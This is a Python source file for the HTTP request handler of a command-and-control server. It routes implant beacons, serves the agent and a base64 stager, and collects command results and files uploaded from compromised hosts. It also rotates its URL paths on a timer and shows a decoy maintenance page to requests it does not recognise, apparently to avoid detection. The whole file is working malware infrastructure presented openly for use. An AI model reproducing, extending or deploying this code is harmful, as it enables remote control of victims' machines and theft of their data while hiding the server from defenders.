import http.server
import logging
# Direct imports from handler files
from handlers.beacon_handler import BeaconHandler
from handlers.agent_handler import AgentHandler
from handlers.file_handler import FileHandler
from handlers.result_handler import ResultHandler
from handlers.file_download_handler import FileDownloadHandler
from core.path_routing import PathRouter
from core.client_operations import ClientHelper
from core.crypto_operations import CryptoHelper


logger = logging.getLogger(__name__)

class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
    """
    Custom HTTP request handler for C2 communications
    Routes requests to appropriate handlers using modular architecture
    """
    
    def __init__(self, request, client_address, server, client_manager, logger, crypto_manager, campaign_name, url_paths=None):
        # Store parameters for later use
        self.client_manager = client_manager
        self.external_logger = logger  # External logger function
        self.crypto_manager = crypto_manager
        self.campaign_name = campaign_name
        
        # Set default URL paths
        self.default_paths = {
            "beacon_path": "/beacon",
            "agent_path": "/raw_agent",
            "stager_path": "/b64_stager",
            "cmd_result_path": "/command_result",
            "file_upload_path": "/file_upload",
            "file_request_path": "/file_request"  # Added file_request_path
        }
        
        # Initialize path rotation
        self._initialize_path_rotation(server, url_paths)
        
        # Create helper objects
        self.crypto_helper = CryptoHelper(crypto_manager, client_manager)
        self.client_helper = ClientHelper(client_manager, self.crypto_helper, server)
                
        # Initialize handler instances
        # We'll create these on demand in the route methods
        
        super().__init__(request, client_address, server)

    def _initialize_path_rotation(self, server, url_paths=None):
        """Initialize path rotation manager"""
        # Update paths with custom paths if provided
        initial_paths = self.default_paths.copy()
        if url_paths:
            initial_paths.update(url_paths)
            
        # Make sure all paths start with '/'
        for key, path in initial_paths.items():
            if not path.startswith('/'):
                initial_paths[key] = '/' + path
                
        # Use existing path manager if available
        if hasattr(server, 'path_manager'):
            path_manager = server.path_manager
        else:
            # Create path rotation manager if not already on server
            from utils.path_rotation import PathRotationManager
            campaign_folder = f"{self.campaign_name}_campaign"
            rotation_interval = getattr(server, 'path_rotation_interval', 3600)  # Default 1 hour
            path_manager = PathRotationManager(
                campaign_folder, 
                self.external_logger, 
                initial_paths=initial_paths,
                rotation_interval=rotation_interval
            )
            # Load existing state if available
            path_manager.load_state()
            # Attach to server for other handlers to use
            server.path_manager = path_manager
            
        # Create path router using the path manager
        self.path_router = PathRouter(path_manager)

    def log_message(self, format_str, *args):
        """Override to use external logger - fixed to handle f-strings properly"""
        # Instead of using % formatting, we'll just pass the formatted string directly
        if args:
            # If traditional args are provided, use standard formatting
            message = format_str % args
        else:
            # Otherwise, assume format_str is already formatted (e.g., from an f-string)
            message = format_str
            
        self.external_logger(f"{self.client_address[0]} - - [{self.log_date_time_string()}] {message}")

    def do_GET(self):
        """Route GET requests to appropriate handlers"""
        # Check if rotation is needed
        if self.path_router.check_rotation():
            self.external_logger(f"Paths rotated during request handling")

        # Log the request
        self.log_message("Received GET request for %s", self.path)

        # Extract base path without query string for routing
        base_path = self.path.split('?')[0] if '?' in self.path else self.path

        # Check which endpoint this path maps to
        endpoint_type = self.path_router.get_endpoint_type(base_path)
        
        # Route to appropriate handler based on endpoint type
        if endpoint_type in ["beacon_path", "previous_beacon_path", "old_beacon_path"]:
            self._handle_beacon(include_rotation_info=(endpoint_type == "old_beacon_path"))
        elif endpoint_type in ["agent_path", "previous_agent_path", "old_agent_path"]:
            self._handle_agent()
        elif endpoint_type in ["stager_path", "previous_stager_path", "old_stager_path"]:
            self._handle_stager()
        elif endpoint_type in ["file_request_path", "previous_file_request_path", "old_file_request_path"]:
            self._handle_file_download()
        else:
            self._handle_default()
    
    def do_POST(self):
        """Route POST requests to appropriate handlers"""
        # Check if rotation is needed
        if self.path_router.check_rotation():
            self.external_logger(f"Paths rotated during request handling")
        
        # Log the request
        self.log_message("Received POST request for %s", self.path)

        # Check which endpoint this path maps to
        endpoint_type = self.path_router.get_endpoint_type(self.path)
        
        # Route to appropriate handler based on endpoint type
        if endpoint_type in ["beacon_path", "previous_beacon_path", "old_beacon_path"]:
            # Add this case to handle POST beacons
            self._handle_beacon(include_rotation_info=(endpoint_type == "old_beacon_path"))
        elif endpoint_type in ["cmd_result_path", "previous_cmd_result_path", "old_cmd_result_path"]:
            self._handle_result()
        elif endpoint_type in ["file_upload_path", "previous_file_upload_path", "old_file_upload_path"]:
            self._handle_file_upload()
        elif endpoint_type in ["file_request_path", "previous_file_request_path", "old_file_request_path"]:
            self._handle_file_download()  # This should already exist in your code
        else:
            # Return a generic 200 response for unmatched paths
            self._handle_default()
    
    def _handle_beacon(self, include_rotation_info=False):
        """Handle beacon requests using BeaconHandler"""
        handler = BeaconHandler(
            self, 
            self.client_manager, 
            self.crypto_helper, 
            self.client_helper, 
            self.path_router
        )
        handler.handle(include_rotation_info=include_rotation_info)
    
    def _handle_agent(self):
        """Handle agent code requests using AgentHandler"""
        handler = AgentHandler(
            self, 
            self.client_manager, 
            self.crypto_helper, 
            self.client_helper, 
            self.path_router
        )
        handler.handle_agent_request()
    
    def _handle_stager(self):
        """Handle stager requests using AgentHandler"""
        handler = AgentHandler(
            self, 
            self.client_manager, 
            self.crypto_helper, 
            self.client_helper, 
            self.path_router
        )
        handler.handle_stager_request()
    
    def _handle_result(self):
        """Handle command result requests using ResultHandler"""
        handler = ResultHandler(
            self, 
            self.client_manager, 
            self.crypto_helper, 
            self.client_helper, 
            self.path_router
        )
        handler.handle()
    
    def _handle_file_upload(self):
        """Handle file upload requests using FileHandler"""
        handler = FileHandler(
            self, 
            self.client_manager, 
            self.crypto_helper, 
            self.client_helper, 
            self.path_router
        )
        handler.handle()
    
    def _handle_file_download(self):
        """Handle file download requests using FileDownloadHandler"""
        handler = FileDownloadHandler(
            self, 
            self.client_manager, 
            self.crypto_helper, 
            self.client_helper, 
            self.path_router
        )
        handler.handle()
    
    def _handle_default(self):
        """Handle default/unmatched paths with a generic response"""
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        
        # Return a generic-looking webpage
        message = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Website</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { font-family: Arial, sans-serif; margin: 0; padding: 20px; }
                .container { max-width: 800px; margin: 0 auto; }
                h1, p { color: #333; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Welcome</h1>
                <p>This page is currently under maintenance. Please check back later.</p>
            </div>
        </body>
        </html>
        """
        self.wfile.write(message.encode("utf-8"))